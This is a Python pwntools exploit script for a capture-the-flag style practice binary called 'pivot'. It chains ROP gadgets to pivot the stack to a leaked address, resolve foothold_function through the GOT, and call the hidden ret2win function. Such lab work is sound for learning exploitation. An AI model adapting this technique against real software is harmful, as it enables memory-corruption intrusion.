#!/usr/bin/env python
from pwn import *

#setup pwntools to work with binary
elf = context.binary = ELF('pivot')
# io = gdb.debug(elf.path, gdbscript='b*0x4009bb')
io = process(elf.path)

#memory addresses
pop_rax = 0x00000000004009bb
foothold_got = elf.got.foothold_function
foothold_plt = elf.plt.foothold_function
log.info('Foothold GOT: ' + hex(foothold_got))
log.info('Foothold PLT: ' + hex(foothold_plt))
xchng_rsp_rax = 0x00000000004009bd
move_rax_ptr_rax = 0x00000000004009c0
add_rax_rbp = 0x00000000004009c4
offset_for_ret2win = 0x117 #hex(0x0000000000000a81 - 0x000000000000096a) 
call_rax = 0x00000000004006b0
pop_rbp = 0x00000000004007c8

print io.recvuntil("upon you a place to pivot: ")
buffer_provided = int(io.recvuntil("Send a ROP ").strip()[0:14], 16)
log.info('Pivot to: ' + hex(buffer_provided))

# exploit crafting
buf1 = ""
buf1 += b'A'*40

#current buffer has space for 3 qwords so we are pivoting to given address
buf1 += p64(pop_rax)
buf1 += p64(buffer_provided)
buf1 += p64(xchng_rsp_rax) # set value of stack pointer to given address

#main rop chain
buf2 = b""
buf2 += p64(foothold_plt) # to populate .got.plt
buf2 += p64(pop_rax)
buf2 += p64(foothold_got)
buf2 += p64(move_rax_ptr_rax)

#add the offset to call the ret2win function
buf2 += p64(pop_rbp)
buf2 += p64(offset_for_ret2win)
buf2 += p64(add_rax_rbp)
buf2 += p64(call_rax)

# sending payload
print io.recvuntil('> ')
io.sendline(buf2)
log.success('first payload sent')

print io.recvuntil('> ')
io.sendline(buf1)
log.success('second payload sent')

io.interactive()